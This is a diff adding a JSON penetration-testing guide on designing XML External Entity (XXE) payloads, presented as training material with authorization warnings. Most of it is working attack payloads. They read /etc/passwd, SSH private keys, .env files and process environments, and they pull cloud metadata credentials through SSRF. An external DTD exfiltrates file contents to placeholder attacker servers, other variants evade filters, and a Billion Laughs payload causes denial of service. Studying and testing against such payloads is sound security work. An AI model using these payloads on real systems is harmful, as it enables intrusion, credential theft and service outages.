@@ -1,0 +1,175 @@
+{
+  "id": "payload-design",
+  "category": "testing",
+  "title": "XXE Payload Design",
+  "description": "Comprehensive guide to designing effective XXE test payloads for various scenarios including classic XXE, blind XXE, and platform-specific attacks.",
+  "severity": "info",
+  "cvssScore": 0,
+  "cvssVector": "",
+  "cwe": "CWE-611: Improper Restriction of XML External Entity Reference",
+  "owasp": "OWASP Top 10:2021 - A05: Security Misconfiguration",
+  "sections": [
+    {
+      "id": "overview",
+      "title": "Overview",
+      "type": "text",
+      "content": "Effective XXE testing requires carefully crafted payloads tailored to the target environment and vulnerability type. This guide covers payload design principles, techniques, and platform-specific considerations.\n\n**Payload Categories:**\n• **Detection Payloads** - Confirm XXE vulnerability exists\n• **Exploitation Payloads** - Extract data or perform SSRF\n• **Platform-Specific Payloads** - Target Windows, Linux, or specific applications\n• **Evasion Payloads** - Bypass filters and WAFs\n• **OOB Payloads** - Blind XXE with out-of-band exfiltration\n\n**Design Principles:**\n• Start with simple detection payloads\n• Escalate to exploitation after confirmation\n• Use safe targets initially (/etc/hostname, not /etc/shadow)\n• Test incrementally to understand parser behavior\n• Document what works for future reference"
+    },
+    {
+      "id": "basic-detection",
+      "title": "Basic Detection Payloads",
+      "type": "text",
+      "content": "**Purpose:** Determine if XML parser expands entities\n\n**Strategy:**\n1. Internal entity test - fastest, lowest impact\n2. External entity to safe file\n3. External entity with network callback\n\n**Progressive Testing:**\n• **Level 1:** Internal entity (completely safe)\n• **Level 2:** External entity to safe local file\n• **Level 3:** External entity to your controlled server\n• **Level 4:** External entity to sensitive file\n\n**Indicators of Success:**\n• Entity value appears in response (classic XXE)\n• HTTP request received at your server (blind XXE)\n• Error message reveals file path\n• Response time increases (may indicate processing)"
+    },
+    {
+      "id": "internal-entity-detection",
+      "title": "Internal Entity Detection",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Level 1: Internal entity test (safest) -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY test \"ENTITY_EXPANSION_SUCCESS\">\n]>\n<root>\n  <data>&test;</data>\n</root>\n\n<!-- Expected if vulnerable:\n     Response contains: ENTITY_EXPANSION_SUCCESS\n     \n     Expected if not vulnerable:\n     Response contains: &test; (literal)\n     or parse error -->\n\n<!-- More specific test with unique marker -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY marker \"xxe_test_12345\">\n]>\n<root>\n  <field>&marker;</field>\n</root>\n\n<!-- Search response for: xxe_test_12345 -->",
+        "isVulnerable": true,
+        "filename": "internal-entity-test.xml"
+      }
+    },
+    {
+      "id": "safe-file-detection",
+      "title": "Safe File Disclosure Detection",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Level 2: External entity to safe files -->\n\n<!-- Linux: Safe system files -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/hostname\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Windows: Safe system files -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Universal: Try to read /etc/issue or similar -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/issue\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Expected if vulnerable:\n     Response contains file contents\n     (hostname, win.ini settings, OS version) -->",
+        "isVulnerable": true,
+        "filename": "safe-file-test.xml"
+      }
+    },
+    {
+      "id": "oob-detection",
+      "title": "Out-of-Band Detection Payloads",
+      "type": "text",
+      "content": "**When to Use OOB:**\n• Response doesn't include XML content (blind XXE)\n• Entity expansion errors suppressed\n• Content not reflected in response\n• Need confirmation without visible output\n\n**OOB Techniques:**\n• HTTP callback to your server\n• DNS lookup to your domain\n• FTP connection attempt\n• Parameter entity with external DTD\n\n**Required Infrastructure:**\n• HTTP server you control (or Burp Collaborator)\n• DNS server with logging (or interactsh.com)\n• Monitor access logs for incoming requests"
+    },
+    {
+      "id": "http-oob-payload",
+      "title": "HTTP Out-of-Band Payload",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Simple HTTP callback -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://YOUR-SERVER.com/xxe-test\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Using Burp Collaborator -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://BURP-COLLABORATOR-ID.burpcollaborator.net/xxe\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Using interactsh.com -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://YOUR-ID.oast.fun/xxe\">\n]>\n<root>\n  <data>&xxe;</data>\n</root>\n\n<!-- Expected:\n     HTTP GET request received at your server\n     Check access logs or Burp Collaborator\n     Confirms XML parser makes external requests -->",
+        "isVulnerable": true,
+        "filename": "http-oob.xml"
+      }
+    },
+    {
+      "id": "parameter-entity-oob",
+      "title": "Parameter Entity OOB (Advanced)",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Step 1: Create external DTD on your server (evil.dtd) -->\n<!-- evil.dtd contents:\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>\">\n%eval;\n%exfiltrate;\n-->\n\n<!-- Step 2: Reference external DTD in payload -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % dtd SYSTEM \"http://YOUR-SERVER.com/evil.dtd\">\n  %dtd;\n]>\n<root>\n  <data>test</data>\n</root>\n\n<!-- How it works:\n     1. Parser loads evil.dtd\n     2. evil.dtd defines parameter entities\n     3. %file reads /etc/passwd\n     4. %eval creates entity that sends data to your server\n     5. %exfiltrate triggers the request\n     6. Your server receives /etc/passwd in query string -->\n\n<!-- Simpler version for detection only -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY % remote SYSTEM \"http://YOUR-SERVER.com/xxe.dtd\">\n  %remote;\n]>\n<root>\n  <data>test</data>\n</root>",
+        "isVulnerable": true,
+        "filename": "parameter-entity-oob.xml"
+      }
+    },
+    {
+      "id": "platform-specific",
+      "title": "Platform-Specific Payload Design",
+      "type": "text",
+      "content": "**Linux Targets:**\n• `/etc/passwd` - User accounts\n• `/etc/shadow` - Password hashes (requires root)\n• `/etc/hosts` - Host mappings\n• `/proc/self/environ` - Environment variables\n• `/proc/self/cmdline` - Process command line\n• `~/.ssh/id_rsa` - SSH private keys\n• `/var/log/apache2/access.log` - Web logs\n\n**Windows Targets:**\n• `C:/Windows/win.ini` - Windows config\n• `C:/Windows/System32/drivers/etc/hosts` - Host file\n• `C:/boot.ini` - Boot configuration (older Windows)\n• `C:/inetpub/wwwroot/web.config` - IIS config\n• `C:/Users/[username]/.ssh/id_rsa` - SSH keys\n\n**Application-Specific:**\n• `.env` - Environment variables (many frameworks)\n• `web.config` - ASP.NET configuration\n• `config/database.yml` - Rails database config\n• `settings.py` - Django settings\n• `composer.json` / `package.json` - Dependency files"
+    },
+    {
+      "id": "linux-payloads",
+      "title": "Linux-Specific Payloads",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Read /etc/passwd -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read application .env file -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/.env\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read SSH private key -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///home/user/.ssh/id_rsa\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read application source code -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///var/www/html/index.php\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read process environment (often contains secrets) -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///proc/self/environ\">\n]>\n<root><data>&xxe;</data></root>",
+        "isVulnerable": true,
+        "filename": "linux-targets.xml"
+      }
+    },
+    {
+      "id": "windows-payloads",
+      "title": "Windows-Specific Payloads",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Read win.ini -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///C:/Windows/win.ini\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Alternative path format -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file://c:\\\\Windows\\\\win.ini\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read IIS web.config -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///C:/inetpub/wwwroot/web.config\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Read hosts file -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- UNC path to network share -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:////attacker-server/share/file.txt\">\n]>\n<root><data>&xxe;</data></root>",
+        "isVulnerable": true,
+        "filename": "windows-targets.xml"
+      }
+    },
+    {
+      "id": "ssrf-payloads",
+      "title": "SSRF Payload Design",
+      "type": "text",
+      "content": "**SSRF via XXE Targets:**\n• Internal web applications (http://localhost:8080)\n• Cloud metadata services (http://169.254.169.254)\n• Internal databases (MySQL, Redis, Memcached)\n• Admin panels (http://admin.internal)\n• Internal APIs (http://api.internal)\n\n**SSRF Techniques:**\n• Port scanning internal network\n• Accessing cloud metadata (AWS, GCP, Azure)\n• Interacting with internal services\n• Bypassing IP-based restrictions\n• Exploiting trust relationships\n\n**Common Targets:**\n• `http://localhost` - Local services\n• `http://127.0.0.1` - Loopback\n• `http://169.254.169.254` - Cloud metadata\n• `http://192.168.1.1` - Internal network\n• `http://10.0.0.1` - Private network"
+    },
+    {
+      "id": "ssrf-examples",
+      "title": "SSRF Payload Examples",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- Access localhost service -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://localhost:8080/admin\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- AWS metadata service -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- GCP metadata service -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Azure metadata service -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Internal API -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"http://internal-api.local/secrets\">\n]>\n<root><data>&xxe;</data></root>",
+        "isVulnerable": true,
+        "filename": "ssrf-payloads.xml"
+      }
+    },
+    {
+      "id": "filter-evasion",
+      "title": "Filter Evasion Techniques",
+      "type": "text",
+      "content": "**Common Filters to Bypass:**\n• Keyword blacklists (SYSTEM, ENTITY, DOCTYPE)\n• Protocol restrictions (file://, http://)\n• URL validation\n• Character filtering\n• Size limits\n\n**Evasion Techniques:**\n\n**1. Encoding:**\n• UTF-16 encoding\n• URL encoding (%53%59%53%54%45%4D)\n• HTML entities (&#x53;YSTEM)\n• Mixed case (SyStEm)\n\n**2. Alternative Protocols:**\n• php:// wrapper (PHP)\n• jar:// protocol (Java)\n• netdoc:// protocol (Java)\n• gopher:// protocol\n\n**3. Path Manipulation:**\n• Path traversal (file:///../../../etc/passwd)\n• Double encoding\n• Unicode normalization\n\n**4. DTD Variations:**\n• External DTD subset\n• Public identifiers\n• Mixed internal/external DTD"
+    },
+    {
+      "id": "evasion-examples",
+      "title": "Evasion Payload Examples",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- UTF-16 encoding -->\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- URL encoding in entity value -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///%65%74%63/%70%61%73%73%77%64\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- Mixed case keywords -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DoCtYpE root [\n  <!EnTiTy xxe SyStEm \"file:///etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- PHP wrapper (PHP applications) -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">\n]>\n<root><data>&xxe;</data></root>\n\n<!-- External DTD to bypass inline filtering -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root SYSTEM \"http://attacker.com/evil.dtd\">\n<root><data>test</data></root>\n\n<!-- evil.dtd contains actual entity definitions -->",
+        "isVulnerable": true,
+        "filename": "evasion-payloads.xml"
+      }
+    },
+    {
+      "id": "dos-payloads",
+      "title": "Denial of Service Payloads",
+      "type": "text",
+      "content": "**Warning:** DoS payloads can crash applications and consume resources. Only test with explicit permission in controlled environments.\n\n**DoS Techniques:**\n• Billion Laughs (exponential entity expansion)\n• Quadratic Blowup (nested entity expansion)\n• External entity to slow resource\n• Large file disclosure\n• Infinite entity recursion (if supported)\n\n**Testing Safely:**\n• Start with small expansion factors\n• Test in non-production first\n• Monitor resource usage\n• Have rollback plan\n• Coordinate with operations team"
+    },
+    {
+      "id": "dos-example",
+      "title": "DoS Payload Example (Use Carefully)",
+      "type": "code",
+      "code": {
+        "language": "xml",
+        "code": "<!-- BILLION LAUGHS - Use only in authorized testing! -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n  <!ENTITY lol \"lol\">\n  <!ENTITY lol1 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n  <!ENTITY lol2 \"&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;\">\n  <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n  <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n  <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n]>\n<lolz>&lol5;</lolz>\n\n<!-- This expands to 10^5 = 100,000 \"lol\" strings\n     Can be extended to lol9 for billions -->\n\n<!-- Safer test: Small expansion -->\n<?xml version=\"1.0\"?>\n<!DOCTYPE test [\n  <!ENTITY a \"aaaaaaaaaa\"> <!-- 10 a's -->\n  <!ENTITY b \"&a;&a;&a;&a;&a;\"> <!-- 50 a's -->\n  <!ENTITY c \"&b;&b;&b;&b;&b;\"> <!-- 250 a's -->\n]>\n<test>&c;</test>\n\n<!-- External entity to large/slow resource -->\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE root [\n  <!ENTITY xxe SYSTEM \"file:///dev/random\">\n]>\n<root><data>&xxe;</data></root>",
+        "isVulnerable": true,
+        "filename": "dos-payload.xml"
+      }
+    },
+    {
+      "id": "payload-checklist",
+      "title": "Payload Design Checklist",
+      "type": "text",
+      "content": "**Pre-Testing:**\n☐ Obtain written authorization\n☐ Understand target platform (Linux/Windows)\n☐ Identify XML processing endpoints\n☐ Set up OOB infrastructure (server/Collaborator)\n☐ Prepare monitoring tools\n\n**Payload Progression:**\n☐ **Step 1:** Internal entity test\n☐ **Step 2:** External entity to safe file\n☐ **Step 3:** External entity with OOB callback\n☐ **Step 4:** Sensitive file disclosure (if authorized)\n☐ **Step 5:** SSRF attempts\n☐ **Step 6:** Platform-specific payloads\n\n**Testing Best Practices:**\n☐ Start with least invasive payloads\n☐ Document what works and what doesn't\n☐ Use unique markers in payloads (e.g., xxe_test_12345)\n☐ Test with various encodings (UTF-8, UTF-16)\n☐ Try different protocols (file://, http://, ftp://)\n☐ Test filter evasion only if initial payloads blocked\n☐ Never test DoS without explicit permission\n\n**Platform-Specific:**\n☐ Identify target OS from error messages/responses\n☐ Use appropriate path separators (/ vs \\)\n☐ Test both absolute and relative paths\n☐ Try common application-specific files\n☐ Check for cloud metadata access\n\n**Documentation:**\n☐ Record all tested payloads\n☐ Note which payloads worked\n☐ Document parser behavior\n☐ Save proof-of-concept for report\n☐ Note any unusual responses or errors"
+    }
+  ],
+  "relatedTopics": ["testing-methodology", "classic-xxe", "blind-xxe", "testing-tools"],
+  "references": [
+    {
+      "title": "PayloadsAllTheThings - XXE Injection",
+      "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection"
+    },
+    {
+      "title": "PortSwigger - XXE Cheat Sheet",
+      "url": "https://portswigger.net/web-security/xxe"
+    },
+    {
+      "title": "HackTricks - XXE",
+      "url": "https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity"
+    }
+  ]
+}
